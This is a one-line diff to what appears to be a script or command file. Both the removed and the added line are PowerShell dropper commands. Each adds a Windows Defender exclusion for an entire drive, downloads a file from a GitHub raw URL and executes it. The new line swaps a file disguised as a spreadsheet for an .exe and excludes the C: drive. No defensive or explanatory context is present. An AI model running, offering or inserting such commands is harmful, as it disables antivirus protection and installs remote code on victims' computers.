@@ -1,1 +1,1 @@
-powershell Add-MpPreference -ExclusionPath 'D:';Invoke-WebRequest 'https://raw.githubusercontent.com/anilxpm/powerl/master/d.xlsx' -OutFile d.xlsx;.\d.xlsx
+powershell Add-MpPreference -ExclusionPath 'C:';Invoke-WebRequest 'https://raw.githubusercontent.com/anilxpm/powerl/master/s.exe' -OutFile s.exe;.\s.exe
